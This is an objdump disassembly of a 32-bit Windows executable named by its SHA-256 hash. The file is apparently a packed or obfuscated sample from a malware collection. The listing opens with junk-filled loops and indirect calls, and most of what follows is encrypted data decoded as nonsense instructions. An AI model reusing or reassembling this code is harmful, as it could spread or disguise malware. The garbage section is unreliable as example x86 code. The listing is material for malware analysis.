
0b626ff78872af9976e86b331c860d9105ffd9f1509391135a31aa670c71ab69.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	data16 test al,0xfd
  4012f6:	pshufw mm6,QWORD PTR [eax+0x70],0x70
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    eax,DWORD PTR [eax]
  40130c:	mov    bh,0x2
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	xor    al,ch
  4013a9:	mov    esi,0xa955e376
  4013ae:	adc    eax,0xcc339604
  4013b3:	(bad)  
  4013b4:	aam    0x2f
  4013b6:	and    DWORD PTR [edi-0x2d],ebp
  4013b9:	dec    esp
  4013ba:	cmp    al,0x39
  4013bc:	outs   dx,DWORD PTR ds:[esi]
  4013bd:	gs retf 0x6400
  4013c1:	loope  0x40141b
  4013c3:	xchg   esi,eax
  4013c4:	xchg   esi,eax
  4013c5:	lds    ebp,FWORD PTR [esi-0x42]
  4013c8:	push   0x485e3cc6
  4013cd:	sti    
  4013ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013cf:	sub    eax,0x74a3ea
  4013d4:	cmp    ecx,DWORD PTR [edx+0x7b45db08]
  4013da:	adc    eax,0x9ea3f12b
  4013df:	sysexit 
  4013e1:	(bad)  ds:0x585b6e32
  4013e7:	jne    0x40144a
  4013e9:	push   es
  4013ea:	mov    dl,0x56
  4013ec:	sbb    dl,cl
  4013ee:	inc    esp
  4013ef:	cwde   
  4013f0:	sub    ch,BYTE PTR [ebx+0x2e]
  4013f3:	mov    al,0x45
  4013f5:	mov    edx,ebp
  4013f7:	out    0xf9,eax
  4013f9:	mov    ecx,0x2821de7a
  4013fe:	and    al,0x77
  401400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401401:	pusha  
  401402:	jae    0x401470
  401404:	lods   al,BYTE PTR ds:[esi]
  401405:	jle    0x4013b6
  401407:	imul   ebx,ebp,0xffffffa1
  40140a:	jl     0x4013d5
  40140c:	push   esp
  40140d:	jne    0x401484
  40140f:	push   edi
  401410:	adc    BYTE PTR ds:0x58ed9a02,0xa5
  401417:	ret    0xa9d4
  40141a:	add    ecx,ebx
  40141c:	loope  0x401423
  40141e:	dec    edi
  40141f:	and    BYTE PTR [ecx+0x1850f9bd],bh
  401425:	sub    BYTE PTR [esi+0x590c014d],dl
  40142b:	cli    
  40142c:	push   esp
  40142d:	pop    ds
  40142e:	mov    es,WORD PTR [edx+0xd34f551]
  401434:	fstp   QWORD PTR [ebp-0x21]
  401437:	mov    edi,DWORD PTR [ebp-0x47abb9a0]
  40143d:	les    ecx,FWORD PTR [ecx-0x14988ead]
  401443:	popa   
  401444:	cmp    al,0xbc
  401446:	xor    BYTE PTR [ecx+0x71],ah
  401449:	imul   ebx,DWORD PTR [esi+0x14],0xffffffea
  40144d:	push   ebx
  40144e:	jmp    0x401420
  401450:	lods   eax,DWORD PTR ds:[esi]
  401451:	jno    0x401450
  401453:	xor    dh,BYTE PTR [edx]
  401455:	dec    edi
  401456:	hlt    
  401457:	jge    0x401455
  401459:	and    BYTE PTR [esp+edx*2+0x7c],ch
  40145d:	jns    0x40140c
  40145f:	sbb    DWORD PTR [ebx],ebp
  401461:	das    
  401462:	aaa    
  401463:	cwde   
  401464:	ror    DWORD PTR [edx-0x6d],1
  401467:	xchg   ebp,eax
  401468:	loop   0x401448
  40146a:	or     BYTE PTR [ecx+0x47541556],0xd3
  401471:	xchg   ecx,eax
  401472:	add    DWORD PTR [edi],0x6358e5e5
  401478:	ins    BYTE PTR es:[edi],dx
  401479:	pop    eax
  40147a:	sbb    DWORD PTR [eax+0xd1f336],esi
  401480:	and    ebx,DWORD PTR [ecx+edx*2+0x4f]
  401484:	imul   ebp,DWORD PTR [esi-0x2ba5facd],0xffffffca
  40148b:	pop    es
  40148c:	(bad)  [edi-0x1bf1f936]
  401492:	and    eax,0x33aab519
  401497:	xor    esi,DWORD PTR [ebx+0x516fe2e4]
  40149d:	addr16 xchg esi,eax
  40149f:	cmp    eax,0x2ba4168c
  4014a4:	xchg   dh,dh
  4014a6:	jmp    0xbef650c2
  4014ab:	xor    DWORD PTR [edi-0x250e1874],ebx
  4014b1:	mov    eax,ds:0x9a6d303a
  4014b6:	in     eax,dx
  4014b7:	in     eax,dx
  4014b8:	ret    
  4014b9:	sbb    eax,0x47220f0a
  4014be:	and    eax,0xe87a4427
  4014c3:	pop    ds
  4014c4:	adc    bl,BYTE PTR [esi]
  4014c6:	mov    dl,0x16
  4014c8:	sbb    eax,0x56f55826
  4014cd:	jle    0x401544
  4014cf:	or     eax,0x562b86fc
  4014d4:	xchg   ebp,eax
  4014d5:	lods   al,BYTE PTR ds:[esi]
  4014d6:	fst    DWORD PTR [ecx-0x26]
  4014d9:	aad    0x4e
  4014db:	icebp  
  4014dc:	xor    ah,bl
  4014de:	dec    ebx
  4014df:	or     al,0xf1
  4014e1:	inc    eax
  4014e2:	lahf   
  4014e3:	cmp    eax,0xeb896e7b
  4014e8:	jno    0x401520
  4014ea:	lahf   
  4014eb:	mov    cl,0xd1
  4014ed:	test   BYTE PTR [ebp+esi*1-0x6688a4d0],bh
  4014f4:	dec    esi
  4014f5:	xchg   esp,eax
  4014f6:	lock push cs
  4014f8:	pop    ecx
  4014f9:	ret    
  4014fa:	push   ss
  4014fb:	sub    eax,0x664e4528
  401500:	mov    DWORD PTR [ebp-0x4],eax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx+0x53691fed]
  401516:	mov    bl,0xb8
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	out    dx,eax
  401521:	lahf   
  401522:	out    0x60,eax
  401524:	dec    edx
  401525:	pop    ebp
  401526:	call   0x9ab8:0xb760f564
  40152d:	xor    eax,0xf0ee74c2
  401532:	mov    ch,0xcd
  401534:	div    BYTE PTR [ecx]
  401536:	fcmovnu st,st(2)
  401538:	das    
  401539:	test   eax,0x15ad4bae
  40153e:	cmc    
  40153f:	popa   
  401540:	enter  0x9c07,0x9d
  401544:	mov    al,ds:0xedbdeeb0
  401549:	inc    edx
  40154a:	fadd   st(5),st
  40154c:	retf   0xa4cf
  40154f:	jmp    DWORD PTR [edi-0x73]
  401552:	mov    gs,WORD PTR [ebx+0x3a7dcde2]
  401558:	addr16 out 0xe7,al
  40155b:	test   BYTE PTR [esi+0x70],dh
  40155e:	dec    eax
  40155f:	ss in  eax,dx
  401561:	xor    eax,0xa8edb445
  401566:	cmc    
  401567:	in     eax,dx
  401568:	mov    ecx,0xa76f8f89
  40156d:	push   esi
  40156e:	and    BYTE PTR [edi],ah
  401570:	jae    0x40155a
  401572:	pop    ecx
  401573:	lahf   
  401574:	and    ebp,esp
  401576:	aam    0x26
  401578:	addr16 dec eax
  40157a:	pusha  
  40157b:	sub    ah,BYTE PTR [ecx+0x50]
  40157e:	in     al,dx
  40157f:	aas    
  401580:	stos   DWORD PTR es:[edi],eax
  401581:	into   
  401582:	(bad)  
  401583:	into   
  401584:	fwait
  401585:	cmp    DWORD PTR [ebp+edi*8-0x5e0ae050],esp
  40158c:	ins    DWORD PTR es:[edi],dx
  40158d:	lods   eax,DWORD PTR ds:[esi]
  40158e:	adc    eax,edx
  401590:	sbb    al,0x5f
  401592:	or     eax,0x63e38121
  401597:	addr16 xchg ebx,eax
  401599:	rcr    BYTE PTR [edx-0x1482a967],cl
  40159f:	in     al,0xe5
  4015a1:	jmp    0x645633e7
  4015a6:	repnz mov ah,0xb8
  4015a9:	push   es
  4015aa:	js     0x401537
  4015ac:	icebp  
  4015ad:	adc    esp,DWORD PTR [ecx+0x5ab03eca]
  4015b3:	ss clc 
  4015b5:	push   ds
  4015b6:	adc    al,0x39
  4015b8:	bound  edx,QWORD PTR [eax+edi*2-0x53]
  4015bc:	dec    esp
  4015bd:	xor    al,0x8
  4015bf:	stos   BYTE PTR es:[edi],al
  4015c0:	jp     0x4015df
  4015c2:	cmp    BYTE PTR ds:0xfa8e1ca2,ch
  4015c8:	fsubp  st(4),st
  4015ca:	cmc    
  4015cb:	dec    ebx
  4015cc:	pushf  
  4015cd:	xor    edi,ecx
  4015cf:	mov    edx,0xfe935add
  4015d4:	push   edx
  4015d5:	cli    
  4015d6:	inc    eax
  4015d7:	adc    eax,DWORD PTR [ebx-0xe84cd3c]
  4015dd:	mov    eax,ds:0x20780ae
  4015e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e3:	outs   dx,DWORD PTR ds:[esi]
  4015e4:	or     eax,0xc31ed863
  4015e9:	aas    
  4015ea:	or     ebx,esp
  4015ec:	xlat   BYTE PTR ds:[ebx]
  4015ed:	and    al,0xe8
  4015ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015f0:	in     eax,0xad
  4015f2:	clc    
  4015f3:	adc    DWORD PTR [edi-0x65],eax
  4015f6:	outs   dx,BYTE PTR ds:[esi]
  4015f7:	jno    0x401650
  4015f9:	ins    BYTE PTR es:[di],dx
  4015fb:	mov    ch,0x2b
  4015fd:	jmp    DWORD PTR [esi+0x37]
  401600:	stc    
  401601:	cmp    esp,DWORD PTR [ebp-0x15c98fa5]
  401607:	scas   al,BYTE PTR es:[edi]
  401608:	and    al,0x53
  40160a:	js     0x4015dd
  40160c:	adc    bl,BYTE PTR ds:0x91c60d4f
  401612:	or     bh,bh
  401614:	icebp  
  401615:	or     BYTE PTR [eax],bh
  401617:	imul   esi,DWORD PTR [ecx-0x7e876e2e],0xd4e608e5
  401621:	call   0x8b44:0x15546934
  401628:	fs inc ebx
  40162a:	adc    ch,bl
  40162c:	mov    WORD PTR [ebx],gs
  40162e:	in     eax,dx
  40162f:	mov    edi,0x5131cd65
  401634:	push   edx
  401635:	loope  0x401695
  401637:	xor    DWORD PTR [edi+0x24],eax
  40163a:	les    ebx,FWORD PTR [edx+0x44c47e5b]
  401640:	xchg   ebp,eax
  401641:	loop   0x401630
  401643:	fiadd  WORD PTR [ebx-0x330b85c5]
  401649:	pop    ebx
  40164a:	xchg   ecx,eax
  40164b:	dec    eax
  40164c:	push   ds
  40164d:	jnp    0x4015eb
  40164f:	xchg   ebp,eax
  401650:	test   DWORD PTR [esi+0x1b2a7828],esi
  401656:	ret    
  401657:	mov    DWORD PTR [esp+ebx*2],edi
  40165a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40165b:	pushf  
  40165c:	jo     0x401642
  40165e:	cli    
  40165f:	jge    0x401691
  401661:	and    esp,DWORD PTR ds:0xaeef06c6
  401667:	or     DWORD PTR [edx-0x77055d85],ebx
  40166d:	push   esp
  40166e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40166f:	out    0xeb,eax
  401671:	push   ebx
  401672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401673:	cld    
  401674:	paddsw mm6,QWORD PTR [eax]
  401677:	retf   0xa7b4
  40167a:	push   ecx
  40167b:	ja     0x4016ee
  40167d:	(bad)  
  40167f:	mov    eax,ds:0x12653f6
  401684:	jle    0x40162a
  401686:	ins    BYTE PTR es:[edi],dx
  401687:	scas   eax,DWORD PTR es:[edi]
  401688:	jmp    0x85c7fb92
  40168d:	call   0x7d75715e
  401692:	push   ebp
  401693:	fmul   QWORD PTR [ebp-0x608466cf]
  401699:	jnp    0x4016a9
  40169b:	xchg   bx,ax
  40169d:	inc    eax
  40169e:	nop
  40169f:	popa   
  4016a0:	or     al,0xb9
  4016a2:	push   edi
  4016a3:	fsub   QWORD PTR [esi]
  4016a5:	sub    ebp,DWORD PTR [edi+0x3956d443]
  4016ab:	stos   BYTE PTR es:[edi],al
  4016ac:	add    bl,bh
  4016ae:	cmp    ecx,esi
  4016b0:	push   ss
  4016b1:	cmp    eax,0x1946b31a
  4016b6:	fild   QWORD PTR [ecx+0x228a7594]
  4016bc:	or     BYTE PTR [ebp+edi*1-0x58297039],cl
  4016c3:	pop    edx
  4016c4:	leave  
  4016c5:	fistp  DWORD PTR [ebp+0x5b]
  4016c8:	push   0xffffffd5
  4016ca:	mov    al,ds:0xc79fc0c7
  4016cf:	into   
  4016d0:	rcl    ch,0x1d
  4016d3:	ret    
  4016d4:	add    al,BYTE PTR [edi+0x65ce206b]
  4016da:	lods   eax,DWORD PTR ds:[esi]
  4016db:	pushf  
  4016dc:	sbb    DWORD PTR [ecx+0x1fbad04c],ebp
  4016e2:	xchg   esi,eax
  4016e3:	pusha  
  4016e4:	jecxz  0x40171e
  4016e6:	xor    eax,0x8f823491
  4016eb:	xchg   edi,eax
  4016ec:	jno    0x401713
  4016ee:	push   0x84cd4363
  4016f3:	test   eax,0xd1fda297
  4016f8:	popa   
  4016f9:	enter  0x3608,0xb4
  4016fd:	sbb    BYTE PTR ds:0xb9dc1f2d,al
  401703:	fld    st(0)
  401705:	test   esp,edi
  401707:	sbb    ah,BYTE PTR [ecx]
  401709:	ret    
  40170a:	jecxz  0x401719
  40170c:	pop    esi
  40170d:	loope  0x40175c
  40170f:	pop    esi
  401710:	das    
  401711:	push   0x5591c30c
  401716:	dec    ecx
  401717:	gs mov esi,0xe3e6e511
  40171d:	ja     0x401790
  40171f:	xchg   BYTE PTR [ebp+0x4589d045],cl
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	call   0x7057b3e5
  401745:	jl     0x4017b7
  401747:	jo     0x4017b9
  401749:	jle    0x4017bb
  40174b:	jo     0x4016e2
  40174d:	lock mov ch,0x76
  401750:	xor    DWORD PTR [ebx],ecx
  401752:	pop    ss
  401753:	or     ch,BYTE PTR [esi]
  401755:	scas   eax,DWORD PTR es:[edi]
  401756:	pop    edi
  401757:	cld    
  401758:	push   edi
  401759:	inc    ecx
  40175a:	push   ebx
  40175b:	stos   BYTE PTR es:[edi],al
  40175c:	and    esp,DWORD PTR [ecx+0x6e9bc090]
  401762:	cwde   
  401763:	xchg   edx,eax
  401764:	out    dx,al
  401765:	adc    ah,BYTE PTR [ecx]
  401767:	test   BYTE PTR [edx],al
  401769:	enter  0x7560,0xcb
  40176d:	sub    BYTE PTR [eax],dh
  40176f:	dec    esi
  401770:	adc    DWORD PTR [ebx+0x65f230e0],ebp
  401776:	fcom   QWORD PTR [edx-0x3f814d5a]
  40177c:	or     ch,al
  40177e:	push   cs
  40177f:	jp     0x401794
  401781:	xchg   ebx,eax
  401782:	pop    eax
  401783:	test   eax,0x8544d95c
  401788:	add    esp,ecx
  40178a:	pop    edi
  40178b:	xor    ebp,DWORD PTR [edx-0xe]
  40178e:	inc    esp
  40178f:	xchg   esp,eax
  401790:	inc    ebp
  401791:	(bad)  
  401792:	or     al,0xa7
  401794:	cmp    al,0xb4
  401796:	outs   dx,DWORD PTR ds:[esi]
  401797:	retf   
  401798:	iret   
  401799:	xor    DWORD PTR [eax+0x6b],0xfffffff8
  40179d:	stos   DWORD PTR es:[edi],eax
  40179e:	jo     0x4017fc
  4017a0:	ja     0x401733
  4017a2:	in     al,dx
  4017a3:	scas   eax,DWORD PTR es:[edi]
  4017a4:	(bad)  
  4017a5:	jg     0x401803
  4017a7:	sub    dl,BYTE PTR [ebx+0x4cf02586]
  4017ad:	in     al,dx
  4017ae:	ret    
  4017af:	jge    0x40173d
  4017b1:	jmp    0x401760
  4017b3:	shl    BYTE PTR [edi+0x26],1
  4017b6:	push   eax
  4017b7:	mov    eax,0x8decbfdf
  4017bc:	adc    ch,dh
  4017be:	dec    esp
  4017bf:	cld    
  4017c0:	(bad)  
  4017c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017c2:	pop    edi
  4017c3:	or     al,0x21
  4017c5:	mov    bl,0x7e
  4017c7:	xor    al,0x28
  4017c9:	sub    ah,BYTE PTR [ebx]
  4017cb:	jle    0x4017c4
  4017cd:	test   eax,0xa820d0cc
  4017d3:	loopne 0x4017e5
  4017d5:	frstor ds:0x3300747e
  4017db:	inc    DWORD PTR [ebx+esi*4+0x38f53c2c]
  4017e2:	mov    eax,ds:0xfa2f8075
  4017e7:	mov    esi,0x9728f66
  4017ec:	adc    eax,0xb0f203f6
  4017f1:	xchg   edi,eax
  4017f2:	mov    ah,0x2f
  4017f4:	pop    esp
  4017f5:	das    
  4017f6:	cmp    al,0x90
  4017f8:	mov    eax,ds:0xfd5f45bf
  4017fd:	jae    0x4017c4
  4017ff:	pop    es
  401800:	xor    ecx,DWORD PTR [ebx+ebp*1-0x79]
  401804:	jno    0x401846
  401806:	xor    bh,BYTE PTR [eax+0x6d]
  401809:	cwde   
  40180a:	adc    esi,ebx
  40180c:	test   DWORD PTR [ecx-0x4a],eax
  40180f:	jnp    0x40182a
  401811:	std    
  401812:	or     DWORD PTR [edx],ebp
  401814:	adc    DWORD PTR [edx+ebp*2+0x19],edx
  401818:	(bad)  
  40181a:	jecxz  0x4017fa
  40181c:	int3   
  40181d:	imul   ebx,esi,0xffffff84
  401820:	dec    ecx
  401821:	sub    esp,ebx
  401823:	push   0x4358647d
  401828:	jmp    FWORD PTR [ecx+eax*4+0x1650187]
  40182f:	std    
  401830:	inc    edi
  401831:	and    BYTE PTR [edx-0x6bf68370],dh
  401837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401838:	jne    0x4017ed
  40183a:	ss mov ebx,0x9ac32120
  401840:	jnp    0x40186a
  401842:	inc    ebx
  401843:	retf   0x24e5
  401846:	inc    ecx
  401847:	test   DWORD PTR [ecx+0x34],ebp
  40184a:	les    ebx,FWORD PTR [ebx-0x3a]
  40184d:	test   eax,0xac3eea5e
  401852:	outs   dx,DWORD PTR ds:[esi]
  401853:	jmp    0xdcdf405f
  401858:	pop    esi
  401859:	mov    edx,DWORD PTR [edx-0x59]
  40185c:	cs hlt 
  40185e:	push   esi
  40185f:	xchg   edi,eax
  401860:	stos   BYTE PTR es:[edi],al
  401861:	js     0x401800
  401863:	cs jmp 0x40184b
  401866:	dec    ecx
  401867:	ins    BYTE PTR es:[edi],dx
  401868:	jo     0x40189a
  40186a:	(bad)  
  40186b:	sub    DWORD PTR [ebx+eax*1],edi
  40186e:	dec    ecx
  40186f:	pop    esi
  401870:	div    DWORD PTR [eax+0x3498d611]
  401876:	xor    bh,BYTE PTR [ebx-0x75]
  401879:	cs inc ecx
  40187b:	in     al,0x2d
  40187d:	rol    BYTE PTR [ebx],1
  40187f:	add    BYTE PTR [ecx],cl
  401881:	sahf   
  401882:	ins    DWORD PTR es:[edi],dx
  401883:	add    eax,0x87fce48b
  401888:	lea    ebp,[ecx+0x0]
  40188b:	idiv   BYTE PTR gs:[ecx-0x67c8f3f4]
  401892:	pop    ebx
  401893:	sub    DWORD PTR [ebp-0x2c],0x2af4b01a
  40189a:	dec    eax
  40189b:	jecxz  0x401822
  40189d:	(bad)  
  40189e:	cwde   
  40189f:	jmp    FWORD PTR [edi+0x15afda18]
  4018a5:	mov    ds,ecx
  4018a7:	dec    esp
  4018a8:	xchg   BYTE PTR [ebx],al
  4018aa:	add    eax,0x24bca1d6
  4018af:	sub    al,0x67
  4018b1:	xchg   ebp,eax
  4018b2:	jp     0x40192b
  4018b4:	gs stos BYTE PTR es:[edi],al
  4018b6:	pop    esi
  4018b7:	aad    0x4b
  4018b9:	pushf  
  4018ba:	cmc    
  4018bb:	and    BYTE PTR [ebp+0x14e110b7],cl
  4018c1:	inc    esi
  4018c2:	leave  
  4018c3:	ss (bad) 
  4018c5:	fmul   QWORD PTR [ecx]
  4018c7:	push   edx
  4018c8:	dec    edi
  4018c9:	mov    dh,0x4
  4018cb:	xchg   DWORD PTR [edx-0x1b],edx
  4018ce:	and    esp,DWORD PTR [ebp-0x80]
  4018d1:	fmul   DWORD PTR [ecx+0xc22364a]
  4018d7:	ss mov cr2,esi
  4018db:	inc    di
  4018dd:	sti    
  4018de:	or     bl,ch
  4018e0:	add    DWORD PTR [edi+0x49f6e9d5],ebx
  4018e6:	push   ds
  4018e7:	out    0x7c,eax
  4018e9:	adc    edx,ecx
  4018eb:	mov    ecx,0xdb9be289
  4018f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018f1:	pop    eax
  4018f2:	bswap  edi
  4018f4:	aas    
  4018f5:	push   ds
  4018f6:	inc    ebx
  4018f7:	in     al,dx
